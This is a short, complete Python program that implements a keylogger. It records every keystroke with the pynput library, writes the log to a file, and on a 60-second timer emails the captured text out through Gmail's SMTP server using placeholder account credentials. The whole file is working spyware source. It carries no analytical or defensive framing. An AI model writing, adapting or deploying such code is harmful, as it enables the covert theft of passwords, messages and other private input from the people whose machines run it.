import smtplib
import threading
from pynput import keyboard

class KeyLogger:
    def __init__(self, log_file='keylog.txt', email='your-email@example.com', password='your-password'):
        self.log = ""
        self.log_file = log_file
        self.email = email
        self.password = password

    def on_press(self, key):
        try:
            self.log += key.char
        except AttributeError:
            if key == keyboard.Key.space:
                self.log += ' '
            elif key == keyboard.Key.enter:
                self.log += '\n'
            else:
                self.log += ' [' + str(key) + '] '

    def on_release(self, key):
        if key == keyboard.Key.esc:
            with open(self.log_file, 'a') as f:
                f.write(self.log)
            return False

    def send_email(self, message):
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(self.email, self.password)
        server.sendmail(self.email, self.email, message)
        server.quit()

    def report(self):
        if self.log:
            self.send_email(self.log)
            self.log = ""
        timer = threading.Timer(60, self.report)
        timer.start()

    def start(self):
        self.report()
        with keyboard.Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            listener.join()

if __name__ == "__main__":
    keylogger = KeyLogger(email='your-email@example.com', password='your-password')
    keylogger.start()